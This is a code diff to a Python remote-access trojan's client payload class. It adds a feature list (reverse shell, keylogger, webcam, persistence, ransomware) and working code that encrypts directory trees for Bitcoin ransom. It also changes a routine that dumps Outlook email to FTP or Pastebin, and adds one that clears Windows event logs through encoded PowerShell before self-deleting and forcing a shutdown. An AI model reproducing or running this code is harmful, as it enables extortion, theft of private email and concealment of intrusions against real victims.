@@ -112,13 +112,40 @@ else:
 
 class ClientPayload(object):
 
+    '''
+    >  30 modules - interactive or automated
+        - reverse tcp:   remotely access host machine with a shell inspired by Meterpreter in the Metasploit Framework
+        - keylogger:     log user keystrokes with the window they were entered in
+        - webcam:        capture image/video or stream live
+        - screenshot:    snap shots of the host desktop
+        - root access:   obtain administrator privileges
+        - persistence:   maintain access with 8 different persistence methods
+        - port scanner:  explore the local network for more hosts, open ports, vulnerabilities
+        - packetsniffer: monitor host network traffic for valuable information
+        - ransom:        encrypt host files and ransom them to the user for Bitcoin
+        - upload:        automatically upload results to Imgur, Pastebin, or a remote FTP server
+
+    >  Portability - supports all major platforms and architectures
+        - automated payload configuration
+        - zero dependencies whatsoever (not even Python is required)
+        - dynamically compiles deliverables as executables native to the host environment
+        - no downloads, no installations, no configuration, no dependencies
+
+    >  Security - encrypted communication, anti-forensics counter-measures
+        - all communication is encrypted end-to-end
+        - AES cipher in CBC mode - secure data confidentiality
+        - HMAC-SHA256 hash authentication - secure data authenticity
+        - Base64 encode data for transport to prevent loss of binary, non-printables, or differing codecs
+        - 256 bit keys generated each session via Diffie-Hellman transactionless key-agreement method
+
+    '''
     __name__ = 'ClientPayload'
     _abort   = 0
     _debug   = 0
-    _config  = {}
+    _config  = OrderedDict()
     _tasks   = Queue.Queue()
     _lock    = threading.Lock()
-    
+
 
     def __init__(self, *args, **kwargs):
         self._workers = OrderedDict()
@@ -618,6 +645,7 @@ class ClientPayload(object):
                 task_id = self._task_id(self.ransom.func_name)
                 task    = {'task': task_id, 'client': self._sysinfo['id'], 'session': self._session['id'], 'command': 'ransom encrypt %s' % ransom.replace('/', '?').replace('\\', '?'), 'result': key}
                 self._results[task_id] = task
+                self.debug('{} encrypted'.format(path))
                 if 'ransom' not in self._workers or not len([k for k in self._workers if 'ransom' in k if self._workers[k].is_alive()]):
                     rnd = self._get_random_var(3)
                     self._workers['ransom-{}'.format(rnd)] = threading.Thread(target=self._task_threader, name=time.time())
@@ -629,14 +657,60 @@ class ClientPayload(object):
 
     def _ransom_decrypt(self, args):
         try:
-            path, rsa, aes = args
-            cipher   = PKCS1_OAEP.new(rsa_key)
-            aes_key  = cipher.decrypt(base64.b64decode(aes))
-            path     = self._decrypt_file(path, key=aes_key)
-            self.debug("{} decrypted".format(path))
+            rsa_key, aes_key, path = args
+            cipher  = PKCS1_OAEP.new(rsa_key)
+            aes     = cipher.decrypt(base64.b64decode(aes_key))
+            result  = self._decrypt_file(path, key=aes)
+            self.debug('%s decrypted' % result)
         except Exception as e:
             self.debug("{} error: {}".format(self._ransom_decrypt.func_name, str(e)))
-                
+
+
+    def _ransom_encrypt_threader(self, arg):
+        try:
+            if os.path.isfile(arg):
+                return self._ransom_encrypt(arg)
+            elif os.path.isdir(arg):
+                self._workers["ransom-tree-walk"] = threading.Thread(target=os.path.walk, args=(arg, lambda _, d, f: [self._tasks.put_nowait((self._ransom_encrypt, os.path.join(d, ff))) for ff in f], None), name=time.time())
+                self._workers["ransom-tree-walk"].daemon = True
+                self._workers["ransom-tree-walk"].start()
+                for i in range(1,10):
+                    self._workers["ransom-%d" % i] = threading.Thread(target=self._task_threader, name=time.time())
+                    self._workers["ransom-%d" % i].daemon = True
+                    self._workers["ransom-%d" % i].start()
+                self._workers["ransom-10"].join()
+                result = {}
+                for k,v in self._results.items():
+                    if 'ransom encrypt' in v.get('command') and '?' in v.get('command'):
+                        if len(json.dumps(result)) < 48000:
+                            result[k] = v
+                        else:
+                            break
+                return json.dumps(result)
+            else:
+                return "Error: '{}' not found".format(arg)
+        except Exception as e:
+            self.debug("{} error: {}".format(self._ransom_encrypt_threader.func_name, str(e)))
+
+
+    def _ransom_decrypt_threader(self, private_rsa_key):
+        try:
+            rsa_key  = RSA.importKey(private_rsa_key)
+            for key, value in self._results.items():
+                cmd1, _, cmd2 = value.get('command').partition(' ')
+                path = cmd2.partition(' ')[2].replace('?','/')
+                if 'ransom' in cmd1 and 'encrypt' in cmd2 and os.path.exists(path):
+                    aes_key = value.get('result')
+                    self._tasks.put_nowait((self._ransom_decrypt, (rsa_key, aes_key, path)))
+            for i in range(1,10):
+                self._workers["ransom-%d" % i] = threading.Thread(target=self._task_threader, name=time.time())
+                self._workers["ransom-%d" % i].daemon = True
+                self._workers["ransom-%d" % i].start()
+            self._workers["ransom-10"].join()
+            return "Ransomed files successfully decrypted"
+        except Exception as e:
+            self.debug("{} error: {}".format(self._ransom_decrypt_threader.func_name, str(e)))
+
 
     def _sms_send(self, phone_number, message):
         try:
@@ -658,31 +732,16 @@ class ClientPayload(object):
             self.debug("{} error: {}".format(self._sms_read.func_name, str(e)))
 
 
-    def _email_dump(self, mode=None, **kwargs):
+    def _email_dump(self, *args, **kwargs):
         try:
             CoInitialize()
+            mode    = args[0] if len(args) else 'ftp'
             outlook = Dispatch('Outlook.Application').GetNameSpace('MAPI')
             inbox   = outlook.GetDefaultFolder(6)
             emails  = self._get_emails_as_json(inbox.Items)
-            return self._upload_ftp(json.dumps(self.email.inbox, indent=2)) if 'ftp' in str(mode) else self._upload_pastebin(json.dumps(self.email.inbox, indent=2))
+            return self._upload_ftp(json.dumps(emails), filetype='.txt') if 'ftp' in mode else self._upload_pastebin(json.dumps(emails))
         except Exception as e2:
             e = "{} error: {}".format(self._email_dump.func_name, str(e2))
-            self.debug(e)
-            return e
-
-
-    def _email_read(self, *args, **kwargs):
-        try:
-            CoInitialize()
-            outlook = Dispatch('Outlook.Application').GetNameSpace('MAPI')
-            inbox   = outlook.GetDefaultFolder(6)
-            emails  = self._get_emails_as_json(inbox.Items)
-            if len(emails):
-                return json.dumps(emails, indent=2)
-            else:
-                return "No emails in Outlook inbox"
-        except Exception as e:
-            e = "{} error: {}".format(self._email_read.func_name, str(e))
             self.debug(e)
             return e
 
@@ -1368,6 +1427,7 @@ class ClientPayload(object):
         try:
             if not len(self.process.buffer.getvalue()):
                 self.process.buffer.write("Time, User , Executable, PID, Privileges")
+            CoInitialize()
             c = WMI()
             process_watcher = c.Win32_Process.watch_for("creation")
             while True:
@@ -2038,6 +2098,15 @@ class ClientPayload(object):
         try:
             self._abort = True
 
+            if os.name is 'nt':
+                path    = os.popen('where powershell').read()
+                logs    = ["application","security","setup","system"]
+                for log in logs:
+                    try:
+                        cmd = base64.b64encode('"& { [System.Diagnostics.Eventing.Reader.EventLogSession]::GlobalSession.ClearLog(\\"%s\\")}"' % log)
+                        ps  = b''.join(subprocess.Popen([path, '-encodedCommand', cmd], 0, None, subprocess.PIPE, subprocess.PIPE, subprocess.PIPE, executable=path).communicate())                       
+                    except Exception as e1:
+                        self.debug("{} error: {}".format(self.abort.func_name, str(e1)))
             for method in self.persistence.methods:
                 if self.persistence.methods[method].get('established'):
                     try:
@@ -2055,16 +2124,17 @@ class ClientPayload(object):
                     _ = os.popen(bytes('del /f /q %s' % __file__ if os.name is 'nt' else 'rm -f %s' % __file__)).read()
                 except: pass            
         finally:
-            _shutdown = lambda: os.popen('shutdown /p /f' if os.name is 'nt' else 'shutdown --poweroff --no-wall').read()
-            shutdown = threading.Timer(2, _shutdown)
-            taskkill = threading.Timer(1, self._process_kill, args=('python',))
+            _shutdown   = lambda: os.popen('shutdown /p /f' if os.name is 'nt' else 'shutdown --poweroff --no-wall').read()
+            shutdown    = threading.Timer(2, _shutdown)
+            taskkill    = threading.Timer(1, self._process_kill, args=('python',))
             shutdown.daemon = True
             taskkill.daemon = True
             shutdown.start()
             taskkill.start()
             sys.exit()
 
-    @config(platforms=['win32','darwin'], inbox=OrderedDict(), command=True, usage='email <option>')
+
+    @config(platforms=['win32','darwin'], inbox=OrderedDict(), command=True, usage='email <option> [mode]')
     def email(self, args=None):
         """
         access Outlook email without opening application
@@ -2073,7 +2143,7 @@ class ClientPayload(object):
             try:
                 CoInitialize()
                 installed = Dispatch('Outlook.Application').GetNameSpace('MAPI')
-                return "Outlook is installed on this host"
+                return "\tOutlook is installed on this host\n\t{}".format(self.email.usage)
             except: pass
             return "Outlook not installed on this host"
         else:
@@ -2088,7 +2158,7 @@ class ClientPayload(object):
                     else:
                         return getattr(self, '_email_%s' % mode)(arg)
                 else:
-                    return "usage: email <dump/read> [#]"
+                    return "usage: email <dump/search> [ftp/pastebin]"
             except Exception as e:
                 self.debug("{} error: {}".format(self.email.func_name, str(e)))
 
@@ -2099,49 +2169,18 @@ class ClientPayload(object):
         encrypt personal files and ransom them
         """
         if not args:
-            return "\tusage: ransom <mode> [path]\n\tmodes: encrypt, decrypt, payment"
-        
+            return "\tusage: ransom <encrypt/decrypt> [path]"
         cmd, _, action = str(args).partition(' ')
-
         if not self._session['id']:
             return "{} error: {}".format(ClientPayload._ransom_payment.func_name, "no session ID")
-            
         if not ClientPayload._config['api'].get('coinbase'):
             return "{} error: {}".format(ClientPayload._ransom_payment.func_name, "no target URL")
-
         if 'payment' in cmd:
             return self._ransom_payment(self._session['id'])
-            
         elif 'decrypt' in cmd:
-            rsa_key  = RSA.importKey(action)
-            for key, value in self._results.items():
-                cmd1, _, cmd2 = value.get('command').partition(' ')
-                path          = cmd2.partition(' ')[2].replace('?','/')
-                if 'ransom' in cmd1 and 'encrypt' in cmd2 and os.path.exists(path):
-                    try:
-                        cipher  = PKCS1_OAEP.new(rsa_key)
-                        aes     = cipher.decrypt(base64.b64decode(value.get('result')))
-                        result  = self._decrypt_file(path, key=aes)
-                        self.debug('%s decrypted' % result)
-                        _ = self._results.pop(key, None)
-                    except Exception as e:
-                        self.debug("{} error: {}".format(self._ransom_decrypt.func_name, str(e)))
-            return "Decrypting files"
-
+            return self._ransom_decrypt_threader(action)
         elif 'encrypt' in cmd:
-            if os.path.isfile(action):
-                return self._ransom_encrypt(action)
-            elif os.path.isdir(action):
-                self._workers["ransom-tree-walk"] = threading.Thread(target=os.path.walk, args=(action, lambda _, d, f: [self._tasks.put_nowait((self._ransom_encrypt, os.path.join(d, ff))) for ff in f], None), name=time.time())
-                self._workers["ransom-tree-walk"].daemon = True
-                self._workers["ransom-tree-walk"].start()
-                for i in range(1,10):
-                    self._workers["ransom-%d" % i] = threading.Thread(target=self._task_threader, name=time.time())
-                    self._workers["ransom-%d" % i].daemon = True
-                    self._workers["ransom-%d" % i].start()
-                return "Encrypting files"
-            else:
-                return "Error: '{}' not found".format(action)
+            return self._ransom_encrypt_threader(action)
         else:
             return "\tusage: ransom <mode> [path]\n\tmodes: encrypt, decrypt, payment"
 
